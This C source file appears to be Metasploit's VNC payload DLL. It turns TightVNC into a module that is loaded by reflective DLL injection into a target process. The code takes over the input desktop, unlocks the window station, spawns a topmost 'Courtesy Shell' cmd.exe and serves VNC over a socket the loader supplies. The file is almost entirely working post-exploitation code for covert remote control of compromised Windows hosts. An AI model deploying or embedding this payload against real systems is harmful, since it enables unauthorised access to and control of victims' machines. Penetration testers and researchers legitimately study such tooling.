/*
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * March 2010: TightVNC 1.3.10 source modified as standalone x86/x64 DLL.
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 * Tested On x86 Windows: - NT4, 2000, XP, 2003, Vista, 2008, 7
 * Tested On x64 Windows: - 2003, 2008R2, 7
 * -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
 */
#include "stdhdrs.h"
#include "common.h"
#include "vncServer.h"

/*
 * Use Reflective DLL Injection.
 */
#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

HANDLE hMessageMutex = NULL;

/*
 * Post an arbitrary message back to a loader.
 */
DWORD vncdll_postmessage( AGENT_CTX * lpAgentContext, DWORD dwMessage, BYTE * pDataBuffer, DWORD dwDataLength )
{
	DWORD dwResult            = ERROR_SUCCESS;
	HANDLE hPipe              = NULL;
	BYTE * pBuffer            = NULL;
	char cNamedPipe[MAX_PATH] = {0};
	DWORD dwWritten           = 0;
	DWORD dwLength            = 0;

	do
	{
		if( !lpAgentContext )
			BREAK_WITH_ERROR( "[VNCDLL] vncdll_postmessage. invalid parameters", ERROR_INVALID_PARAMETER );
		
		dwLength = sizeof(DWORD) + sizeof(DWORD) + dwDataLength;

		pBuffer = (BYTE *)malloc( dwLength );
		if( !pBuffer )
			BREAK_WITH_ERROR( "[VNCDLL] vncdll_postmessage. pBuffer malloc failed", ERROR_INVALID_HANDLE );
				
		memcpy( pBuffer, &dwMessage, sizeof(DWORD) );
		memcpy( (pBuffer+sizeof(DWORD)), &dwDataLength, sizeof(DWORD) );
		memcpy( (pBuffer+sizeof(DWORD)+sizeof(DWORD)), pDataBuffer, dwDataLength );

		if( WaitForSingleObject( hMessageMutex, INFINITE ) != WAIT_OBJECT_0 )
			BREAK_WITH_ERROR( "[VNCDLL] vncdll_postmessage. WaitForSingleObject failed", ERROR_INVALID_HANDLE );

		_snprintf( cNamedPipe, MAX_PATH, "\\\\.\\pipe\\%08X", lpAgentContext->dwPipeName );

		dprintf("[VNCDLL] vncdll_postmessage. pipe=%s, message=0x%08X, length=%d", cNamedPipe, dwMessage, dwDataLength);

		while( TRUE )
		{
			hPipe = CreateFileA( cNamedPipe, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
			if( hPipe != INVALID_HANDLE_VALUE )
				break;

			if( GetLastError() != ERROR_PIPE_BUSY )
				BREAK_ON_ERROR( "[VNCDLL] vncdll_postmessage. ERROR_PIPE_BUSY" );

			if( !WaitNamedPipe( cNamedPipe, 20000 ) )
				BREAK_ON_ERROR( "[VNCDLL] vncdll_postmessage. WaitNamedPipe timedout" );
		}
		
		if( dwResult == ERROR_SUCCESS )
		{
			if( !WriteFile( hPipe, pBuffer, dwLength, &dwWritten, NULL ) )
				BREAK_ON_ERROR( "[VNCDLL] vncdll_postmessage. WriteFile dwMessage length failed" );
		}

	} while( 0 );

	CLOSE_HANDLE( hPipe );

	if( pBuffer )
		free( pBuffer );
		
	ReleaseMutex( hMessageMutex );

	return dwResult;
}

/*
 * 
 */
VOID vncdll_unlockwindowstation( VOID )
{
	HMODULE hUser32 = LoadLibrary( "user32.dll" );
	if( hUser32 )
	{
		typedef BOOL (WINAPI * UNLOCKWINDOWSTATION)( HWINSTA );
		UNLOCKWINDOWSTATION pUnlockWindowStation = (UNLOCKWINDOWSTATION)GetProcAddress( hUser32, "UnlockWindowStation" );
		if( pUnlockWindowStation )
			pUnlockWindowStation( GetProcessWindowStation() );

		FreeLibrary( hUser32 );
	}
}

/*
 * Switch to the input desktop and set it as this threads desktop.
 */
HDESK vncdll_getinputdesktop( BOOL bSwitchStation )
{
	DWORD dwResult         = ERROR_ACCESS_DENIED;
	HWINSTA hWindowStation = NULL;
	HDESK hInputDesktop    = NULL;
	HWND hDesktopWnd       = NULL;	

	do
	{
		if( bSwitchStation )
		{
			// open the WinSta0 as some services are attached to a different window station.
			hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
			if( !hWindowStation )
			{
				if( RevertToSelf() )
					hWindowStation = OpenWindowStation( "WinSta0", FALSE, WINSTA_ALL_ACCESS );
			}
			
			// if we cant open the defaut input station we wont be able to take a screenshot
			if( !hWindowStation )
				BREAK_WITH_ERROR( "[VNCDLL] vncdll_getinputdesktop: Couldnt get the WinSta0 Window Station", ERROR_INVALID_HANDLE );
			
			// set the host process's window station to this sessions default input station we opened
			if( !SetProcessWindowStation( hWindowStation ) )
				BREAK_ON_ERROR( "[VNCDLL] vncdll_getinputdesktop: SetProcessWindowStation failed" );
		}

		// grab a handle to the default input desktop (e.g. Default or WinLogon)
		hInputDesktop = OpenInputDesktop( 0, FALSE, MAXIMUM_ALLOWED );
		if( !hInputDesktop )
			BREAK_ON_ERROR( "[VNCDLL] vncdll_getinputdesktop: OpenInputDesktop failed" );

		// set this threads desktop to that of this sessions default input desktop on WinSta0
		SetThreadDesktop( hInputDesktop );
	
	} while( 0 );

	return hInputDesktop;
}

/*
 * Create the Metasploit Courtesy Shell
 */
VOID vncdll_courtesyshell( HDESK desk )
{
	DWORD dwResult         = ERROR_SUCCESS;
	HWND hShell            = NULL;
	STARTUPINFOA si        = {0};
	PROCESS_INFORMATION pi = {0};
	char name_win[256]     = {0};
	char name_des[256]     = {0};
	char name_all[1024]    = {0};
	
	do
	{
		dprintf( "[VNCDLL] vncdll_courtesyshell. desk=0x%08X", desk );

		memset(name_all, 0, sizeof(name_all));

		GetUserObjectInformation( GetProcessWindowStation(), UOI_NAME, &name_win, 256, NULL );
		GetUserObjectInformation( desk, UOI_NAME, &name_des, 256, NULL );

		_snprintf( name_all, sizeof(name_all)-1, "%s\\%s", name_win, name_des );

		memset( &pi, 0, sizeof(PROCESS_INFORMATION) );
		memset( &si, 0, sizeof(STARTUPINFOA) );

		si.cb              = sizeof(STARTUPINFOA);
		si.dwFlags         = STARTF_USESHOWWINDOW | STARTF_USEFILLATTRIBUTE;
		si.wShowWindow     = SW_NORMAL;
		si.lpDesktop       = name_all;
		si.lpTitle         = "Metasploit Courtesy Shell (TM)";
		si.dwFillAttribute = FOREGROUND_RED|FOREGROUND_BLUE|FOREGROUND_GREEN|BACKGROUND_BLUE;
		
		if( !CreateProcess( NULL, "cmd.exe", 0, 0, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi ) )
			BREAK_ON_ERROR( "[VNCDLL] vncdll_courtesyshell. CreateProcess failed" );

		CloseHandle( pi.hThread );
		CloseHandle( pi.hProcess );
			
		Sleep( 1000 );
		
		hShell = FindWindow( NULL, "Metasploit Courtesy Shell (TM)" );
		if( !hShell )
			break;

		SetWindowPos( hShell, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE|SWP_NOSIZE );

	} while( 0 );
}

/*
 * Create and run a VNC server on this socket.
 */
DWORD vncdll_run( AGENT_CTX * lpAgentContext )
{
	DWORD dwResult      = ERROR_SUCCESS;
	VSocketSystem * vsocketsystem = NULL;
	vncServer * vserver = NULL;
	HDESK desk          = NULL;
	WSADATA WSAData     = {0};
	SOCKET sock         = 0;
	BYTE bFlags         = 0;

	do
	{
		dprintf( "[VNCDLL] vncdll_run. Started..." );

		if( !lpAgentContext )
			BREAK_WITH_ERROR( "[VNCDLL] vncdll_run. invalid parameters", ERROR_INVALID_PARAMETER );
		
		hMessageMutex = CreateMutex( NULL, FALSE, NULL );

		desk = vncdll_getinputdesktop( TRUE );
		
		vncdll_unlockwindowstation();

		if( !lpAgentContext->bDisableCourtesyShell )
			vncdll_courtesyshell( desk );

		vsocketsystem = new VSocketSystem();
		if( !vsocketsystem->Initialised() )
			BREAK_WITH_ERROR( "[VNCDLL] vncdll_run. VSocketSystem Initialised failed", ERROR_NETWORK_ACCESS_DENIED );

		vserver = new vncServer();

		vncClientId cid = vserver->AddClient( lpAgentContext );

		dprintf( "[VNCDLL-0x%08X] vncdll_run. Going into wait state... cid=%d", hAppInstance, cid );
	
		WaitForSingleObject( lpAgentContext->hCloseEvent, INFINITE );
		
		vserver->RemoveClient( cid );

	} while( 0 );

	dprintf( "[VNCDLL-0x%08X] vncdll_run. terminating...", hAppInstance );

	delete vserver;

	delete vsocketsystem;

	CLOSE_HANDLE( hMessageMutex );

	return 0;
}

/*
 * Grab a DWORD value out of the command line.
 * e.g. vncdll_command_dword( "/FOO:0x41414141 /BAR:0xCAFEF00D", "/FOO:" ) == 0x41414141
 */
DWORD vncdll_command_dword( char * cpCommandLine, char * cpCommand )
{
	char * cpString = NULL;
	DWORD dwResult  = 0;

	do
	{
		if( !cpCommandLine || !cpCommand )
			break;
		
		cpString = strstr( cpCommandLine, cpCommand );
		if( !cpString )
			break;

		cpString += strlen( cpCommand );

		dwResult = strtoul( cpString, NULL, 0 );

	} while( 0 );

	return dwResult;
}

/*
 * The real entrypoint for this app.
 */
VOID vncdll_main( char * cpCommandLine )
{
	DWORD dwResult = ERROR_INVALID_PARAMETER;

	__try
	{
		do
		{
			dprintf( "[VNCDLL] vncdll_main. cpCommandLine=0x%08X", (DWORD)cpCommandLine );

			if( !cpCommandLine )
				break;

			if( strlen( cpCommandLine ) == 0 )
				break;
					
			dprintf( "[VNCDLL] vncdll_main. lpCmdLine=%s", cpCommandLine );
				
			if( strstr( cpCommandLine, "/v" ) )
			{
				AGENT_CTX * lpAgentContext = NULL;

				lpAgentContext = (AGENT_CTX *)vncdll_command_dword( cpCommandLine, "/c:" );

				dwResult = vncdll_run( lpAgentContext );

				if( lpAgentContext )
				{
					int i = 0;
					if( lpAgentContext->hCloseEvent )
						CloseHandle( lpAgentContext->hCloseEvent );
					/*for( i=0 ; i<4 ; i++ )
					{
						if( lpAgentContext->dictionaries[i] )
						{
							int size = ( sizeof(DICTMSG) + lpAgentContext->dictionaries[i]->dwDictLength );
							memset( lpAgentContext->dictionaries[i], 0, size );
							VirtualFree( lpAgentContext->dictionaries[i], 0, MEM_RELEASE );
						}
					}*/
					memset( lpAgentContext, 0, sizeof(AGENT_CTX) );
					VirtualFree( lpAgentContext, 0, MEM_RELEASE );
				}
			}

		} while( 0 );
	}
	__except( EXCEPTION_EXECUTE_HANDLER )
	{
		dprintf( "[VNCDLL] vncdll_main. EXCEPTION_EXECUTE_HANDLER" );
		dwResult = ERROR_UNHANDLED_EXCEPTION;
	}
		
	dprintf( "[VNCDLL=0x%08X] vncdll_main. ExitThread dwResult=%d\n\n", hAppInstance, dwResult );

	ExitThread( dwResult );
}

/*
 * DLL entry point. If we have been injected via RDI, lpReserved will be our command line.
 */
BOOL WINAPI DllMain( HINSTANCE hInstance, DWORD dwReason, LPVOID lpReserved )
{
    BOOL bReturnValue = TRUE;

	switch( dwReason ) 
    { 
		case DLL_PROCESS_ATTACH:
			hAppInstance = hInstance;
			if( lpReserved != NULL )
				vncdll_main( (char *)lpReserved );
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }

	return bReturnValue;
}
